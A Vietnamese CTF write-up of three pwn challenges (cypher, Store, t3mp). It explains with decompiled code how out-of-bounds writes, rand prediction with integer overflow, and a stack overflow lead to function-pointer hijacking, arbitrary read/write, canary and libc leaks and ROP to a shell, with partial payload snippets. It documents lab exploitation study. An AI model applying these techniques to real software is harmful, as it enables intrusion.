# Write up lọc thành viên
## cypher 
```
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char name[32]; // [rsp+0h] [rbp-C0h] BYREF
  int (__fastcall *func_ptr_1)(__int64, unsigned __int64); // [rsp+20h] [rbp-A0h]
  int (*shell_call)(); // [rsp+28h] [rbp-98h]
  _BYTE arr[140]; // [rsp+30h] [rbp-90h]
  int i; // [rsp+BCh] [rbp-4h]

  setup();
  puts("CipherBox Pro v3.1 - Byte Encoder\n");
  memset(name, 0, 0xB8u);
  printf("Name: ");
  readstr(name, 32);
  func_ptr_1 = print_hex;
  shell_call = session_done;
  for ( i = 0; i <= 127; ++i )
    arr[i] = i ^ 90;
  printf("[+] '%s' ready.\n\n", name);
  while ( 1 )
  {
    puts("[1]set [2]get [3]encode [4]reset [5]dump [0]quit");
    printf(">> ");
    switch ( readint() )
    {
      case 0:
        shell_call();                           // overwrite to be main -> bypass 0x10 alignment of system
        return 0;
      case 1:
        do_set((__int64)name);                  // oob write
...
```
Bài này có bug khá rõ là oob ở do_set dẫn đến ghi đè function ptr. Em sẽ ghi đè exe.plt.system vào func_ptr_1 để có thể thực hiện system call
Trước đó em sẽ set up chuỗi 'sh' bằng hàm do_set nhờ vào bug oob
```
int __fastcall do_set(__int64 ptr)
{
  unsigned int end; // [rsp+18h] [rbp-8h]
  unsigned int start; // [rsp+1Ch] [rbp-4h]

  printf("  From (0-255): ");
  start = readint();
  printf("  To   (0-255): ");
  end = readint();
  if ( start >= 0x100 || end >= 0x100 )
    return puts("  [-] Invalid byte value");
  set_mapping(ptr, start, end);
  return puts("  [+] Updated");
}
```
Tiếp theo, gọi do_encode sao cho chương trình lấy đúng chuỗi 'sh' mà em đã thiết lập trước đó rồi gọi system mà em đã set up trước đó.

Hàm này khá đặt biệt là nó sử dụng input của em như idx để lấy dữ liệu từ stack.
```
int __fastcall do_encode(__int64 ptr)
{
  char v2[256]; // [rsp+10h] [rbp-210h] BYREF
  char s[256]; // [rsp+110h] [rbp-110h] BYREF
  size_t len; // [rsp+210h] [rbp-10h]
  size_t i; // [rsp+218h] [rbp-8h]

  printf("  Text: ");
  readstr(s, 256);
  len = strlen(s);
  if ( !len )
    return puts("  [-] Empty input");
  for ( i = 0; i < len; ++i )
    v2[i] = *(_BYTE *)(ptr + (unsigned __int8)s[i] + 48);// getting arbitrary value from the stack
  v2[len] = 0;
  ++*(_DWORD *)(ptr + 176);
  printf("  [+] ");
  return (*(__int64 (__fastcall **)(char *, size_t))(ptr + 32))(v2, len);// call shell
}
```
## Store
Bài này thì khá là khó ở chỗ code dài nên em bị đánh tâm lý khúc này. Challenge này có 1 bug chính, OOB write dẫn đến arbitrary read and write theo cách của em

Program bị lỗi khá nặng ở hàm best seller, nó lấy giá trị purchse_count của product như là 1 IDX. Mà em có thể điều khiển đc nó dẫn đến điều khiển 
được nơi program trích xuất từ count trong vùng heap

Nhờ đó em sẽ oob tới vùng feedback mà em đã nhập trước đó để count[val] lấy giá trị từ đó thành IDX thứ 2

```
...
for (int i = n - 1; i >= 0; i--)
    {
        if (products[i]) // product exist
        {
            int val = products[i]->purchase_count;
            int pos = count[val] - 1;
            output[pos] = products[i];
            count[val]--;
        }
    }
...
```
Nhờ vào việc điều khiển đc cả val và pos thì em đã điều khiển đc nơi mà products[i] sẽ đc store. Chính là ngay vùng len và con trỏ tới feedback của em

<img width="1040" height="978" alt="image" src="https://github.com/user-attachments/assets/103b76ed-d57a-4234-8b9d-9b402d18aab3" />

Kế tiếp là tính toán offset để mà oob, vì chương trình sử dụng hàm rand để random purchase_count của từng trái cây nên em sẽ sử dụng rand luôn để dự đoán các giá trị kế tiếp của chương trình. Điều này diễn ra là vì tính chất hàm rand nếu có cùng mốc thời gian thì sẽ có 1 quy luật đưa ra các số cụ thể, nó ko hẳn là ko thể dự đoán.

Em phải làm tới mức này là vì em cần điều khiển val sao cho chính xác nhất có thể thì mới kiểm soát hoàn toàn được IDX ở các bước kế tiếp

Lưu ý là cx phải checkout liên tục tại vì em ko thể nhập số lớn quá 0x7fffffff, vì em có thể mua liên tục và khi checkout, chương trình cộng dồn
số lượng của em với purchase_count mà ko hề check dẫn đến em có thể bypass việc chương trình chặn nhập số âm

- Code bypass:
```
...
add(9, (0x7fffffff-cnt[9]))
checkout()
add(9, 0x7fffffff-2)
checkout()
...
```
Đồng thời, em cũng cần val < 0 tại vì chương trình có khúc lấy purchase_count lớn nhất rồi malloc sao cho lớn hơn gấp 4 lần con số đó. Vì v em sẽ làm nó âm để nó trích xuất lùi về sau 
```
...
int max_val = 0;
    int n = 10;

    for (int i = 0; i < n; i++)
    {
        // products[i]->purchase_count > 0x7f --> products[i]->purchase_count < 0 ==> max_val not count on
        if (products[i] && products[i]->purchase_count > max_val)
        {
            max_val = products[i]->purchase_count;
        }
    }

    int size_needed = (max_val + 1) * sizeof(int);
    int *count = (int *)malloc(size_needed);
...
```
Và cũng vì malloc size thay đổi liên tục vì max_val chính là giá trị mà rand generate tại 1 mốc thời gian random nên em sẽ phải code 1 tí thuật toán để tìm ra chunk_size thực sự (tính cả meta data) đc sử dụng
```
...
def get_actual_chunk_size(request_size):
    request_size = (request_size+1)*4
    total = request_size + 8
    
    if total < 32:
        return 32
    
    actual_size = (total + 15) & ~15
    
    return actual_size
max = 0
for i in range(10):
    info(f'value {i}: {hex(cnt[i])}')
    if (cnt[i] > max):
        max = cnt[i]

chunk_size = get_actual_chunk_size(max)
...
```
Lý do đương nhiên cũng là vì độ chính xác của IDX mà em đã control, em muốn nó thực sự trích xuất IDX thứ 2 từ feedback của em

<img width="1317" height="997" alt="image" src="https://github.com/user-attachments/assets/3580121d-2887-4919-b534-1271cd593e4a" />

Vùng hồng là nơi chứa len và ptr của feedback, hiện tại code của em đã overwrite len của feedback ở <b> 0x55555555c2a0 </b>

Vùng xanh lá là vùng nhập feedback

Vùng xanh dương chứa các IDX default của program

Vùng vàng là nơi chứa các products[i] mà đáng lẽ chương trình phải ghi tại đó.

Vì em phải vượt qua vùng malloc có size thay đổi liên tục đó nên em phải tìm ra chunk_size dựa vào code ở trên mà tính offset trừ cho hợp lệ

Đến đây thì em chỉ cần overwrite len và feedback ptr của em thành products[i] là đc.

<img width="1266" height="924" alt="image" src="https://github.com/user-attachments/assets/00ed388a-99e3-4573-a04d-7b75e060fb02" />

Vì đã có len cực kì lớn nên em cứ đè con trỏ tại <b> rax </b> đúng 1 bytes để nó trỏ tới 1 vị trí chứa binary ngay trên chuỗi apple

<img width="825" height="684" alt="image" src="https://github.com/user-attachments/assets/4723db18-c5e7-42c8-b81a-978bb5b68c6b" />

Tới đây là đủ kết thúc challenge r, em chỉ cần chọn option 1 để leak binary r luân phiên đè thành các vùng chứa libc --> stack là em sẽ có hết

Cuối cùng là spam sao cho đè đc comment ptr tại <b> 0x555555559360 </b> sao cho nó trỏ tới fake comment của em là em sẽ có thể arbitrary write, bước này em chọn arbitrary write tại rip để lấy shell là win

<img width="1166" height="973" alt="image" src="https://github.com/user-attachments/assets/20a08d01-d460-407a-b7c9-70ac61a6c221" />
## t3mp
Bài này thì hiện tại em đã ra shell bên local và docker r mà trên server ko ra nên wu của em có thể chỉ xài đc bên docker là cùng ạ

Hướng đi của em tập trung exploit bug bof của chương trình, nhờ vào đó em có thể leak canary và libc ở rip của main. Đồng thời ghi đè rip để rop chain sau đó luôn

Em sẽ tập trung exploit 3 case chính của main: 0x1337, 0x700 và 0xDEAD bên default

Trước khi phân tích 3 case rồi cách em exploit thì dưới đây là 2 struct mà em define cho code của em
```
00000000 struct __fixed cl // sizeof=0xF8
00000000 {
00000000     int idx __strlit(C,"UTF-8");
00000004     int pad;
00000008     arr arr[10];
000000F8 };

FFFFFFFF // wrong or deleted type #10
FFFFFFFF
FFFFFFFF // wrong or deleted type #11
FFFFFFFF
00000000 struct __fixed arr // sizeof=0x18
00000000 {                                       // XREF: cl/r
00000000     int chosen;
00000004     int pad2;
00000008     char len[8] __strlit(C,"UTF-8");
00000010     char ptr[8] __strlit(C,"UTF-8");
00000018 };
```

Em sẽ phân tích case 0x1337 trước, và cũng là nơi mà em điều khiển đc các biến quan trọng gồm <b> admin_str, idx_3 và len_vul_0 </b>
```
      case 0x1337:                             
        if ( !packet->arr[0].chosen && packet->arr[1].chosen == 2 )
        {
          len = strlen(*(const char **)packet->arr[1].ptr);
          if ( len <= 0x3000 )
          {
            controlled_ptr = *(const void **)packet->arr[1].ptr;
            copy_safe(admin_str, controlled_ptr, len);
            idx_3 = len;
            len_vul_0 = *(_QWORD *)packet->arr[0].len;
            if ( len_vul_0 + (int)len <= 0x3000 )
              size = len_vul_0;
            else
              print((unsigned int)"size is too large", (_DWORD)controlled_ptr, len_vul_0, v45, v46, v47);
          }
          else
          {
            print((unsigned int)"data too big \n", (unsigned int)buf, v40, v41, v42, v43);
          }
        }
```
Ở đây thì có 2 biến quan trọng em cần điều khiển để gây bof chính là <b> idx_3 và size </b>, lý do là vì ở option "0xDEAD" sẽ sử dụng &admin_str[idx_3] như là dest_ptr nhờ vào hàm copy_safe và copy với lượng "size" byte từ vùng buf mà em nhập sau ở <b> option 2 unpack </b>
```
 if ( choice == 0xDEAD && packet->arr[0].chosen == 2 )
        {
          len_data = size;
          if ( *(_QWORD *)packet->arr[0].len < size )
          {
            len_data = *(_QWORD *)packet->arr[0].len;
            size -= len_data;
          }                                     // idx_3 can be controlled by 
                                                // strlen of my input len
          copy_safe(&admin_str[idx_3], *(const void **)packet->arr[0].ptr, len_data);
        }
```
Mà em có thể điều khiển size tùy ý ở option 0x1337 nếu
 ```
len_vul_0 + (int)len <= 0x3000
 ```
 Em dễ dàng điều khiển đc cả len vì chương trình xài hàm <b> strlen </b> để check độ dài input

 Thế thì em chỉ cần spam NULL byte cho đủ bên unpack là xong
 ```
 VD: packet->arr[1].len = 0x50
 Vậy thì em spam b'\0'*0x50 là đủ độ dài len check ở hàm unpack
 --> điều khiển đc len theo ý muốn của em
 ```
 Nhờ vào len = idx_3 điều khiển đc nên em có thể điều khiển nơi mà chương trình copy tới
 ```
 copy_safe(&admin_str[idx_3], *(const void **)packet->arr[0].ptr, len_data);
 ```
Nhìn vào code trên của option 0xDEAD thì len_data = size và em có thể điều khiển đc nó nhờ vào ``` vul_len_0 = packet->arr[0].len ``` ở option 0x1337 

Bug nằm ở chỗ chương trình chỉ thực hiện ``` size = len_vul_0 ``` khi <b> len_vul_0 + (int)len <= 0x3000 </b>

Dựa vào đặc điểm này, em set nó thành 1 cái size để ghi tiếp sau khi ghi 1 lượng lớn byte < 0x3000 trên <b> admin_str </b> vì option 0xDEAD cho phép em ghi tiếp từ nơi  mà em ngừng copy input
- Cách em set up size:
```
load  = [
{
    'type': NUMBER,
    'value': 0x100 # size
},
{
    'type': BIN,
    'data': b'\0' # data bên option 2
}]
```
Vì em chỉ set up size thôi nên em sẽ bỏ qua phần data, em sẽ ko thể set up 2 cái cùng lúc nên em phải làm theo đúng tuần tự là  <b> set up size trước rồi mới tới IDX </b>

- IDX set up:
```
load  = [
{
    'type': NUMBER,
    'value': 0xfffff # size
},
{
    'type': BIN,
    'data': b'h'*(0x2fe0)

}]
```
Nhờ vào việc em set size > 0x3000 nên nó sẽ auto ko set up lại cái size. Còn việc copy data từ buf sang stack thì program vẫn cứ thế mà làm

Sau khi đã set up xong rồi thì em thực hiện nối chuỗi nhờ vào controlled size --> bof tới canary và rip ở 0xDEAD:
```
...
copy_safe(&admin_str[idx_3], *(const void **)packet->arr[0].ptr, len_data);
...
```

Vì ``` option 0x7000 ``` sử dụng '%s' để in chuỗi nên em chỉ cần căn chỉnh đề chương trình nối chuỗi với canary, rip_main mà leak cả 2
```
...
print("admin: %s \n", admin_str);
...
```
Em chỉ cần lặp lại việc này 2 lần là có canary và libc. Kế tiếp là ghi đè lần nữa, căn chỉnh canary hợp lệ và rop chain to shell là win

Mặc dù trên local với docker thì ra dễ vậy. Nhưng lúc lên remote thì em sẽ bị vướng 1 vài tính chất của việc truyền packet với size lớn qua đường truyền mạng với server. Qua những gì em tìm hiểu được thì khi gửi 1 luợng lớn bytes qua đường truyền mạng. Packet của em sẽ đc chia thành các mảnh vỡ nhỏ rồi gửi theo thứ tự các mảnh đó

Vấn đề là chương trình chỉ nhận packet 1 lần, trong khi packet của em bị tính chất của đường truyền chia ra thành nhiều mảnh ghép. Điều đó khiến cho packet của em ko nhận được hết, chỉ nhận được 1 phần

Để khắc phục điều này thì em cần phải áp dụng bug race condition, khiến cho chương trình trì hoãn 1 lúc để nhân lúc đó gửi payload của em. Lý do là vì các packet sau khi đc chia thành các mảnh nhỏ thì sẽ có cái nhanh hay chậm hơn, khiến nó ko thể nhận đc tất cả đồng thời

Nếu trong thời gian em gửi packet mà chương trình bị delay thì các mảnh vỡ packet nhỏ sẽ có thời gian đi tới chương trình và ở trong hàng chờ, đợi hàm read nhận và xử lý. Lúc đó thì read sẽ đọc hết packet của em cùng 1 lúc. Khiến cho việc exploit thực thi được

- Case mà em sử dụng:
```
case 0x100:
        logcat("what's your plan ? \n", (__int64)buf, v11, v12, v13, v14);
        logcat("Is that a shell ? \n", (__int64)buf, v15, v16, v17, v18);
        logcat("It's not here ! \n", (__int64)buf, v19, v20, v21, v22);
        sleep(1u);
        break;
...
```
Vì chương trình sử dụng sleep 1s nên em sẽ gửi ngay lập tức payload chính của em ngay sau đó bằng send, trong khi chương trình đang nghỉ. Sau khi sleep xong thì nó sẽ xử lý các packet đã gửi tới bằng read và thực thi bof như ý muốn của em
<img width="1357" height="838" alt="image" src="https://github.com/user-attachments/assets/f7fac3c9-03da-46b3-aa48-8b4b1b89037b" />

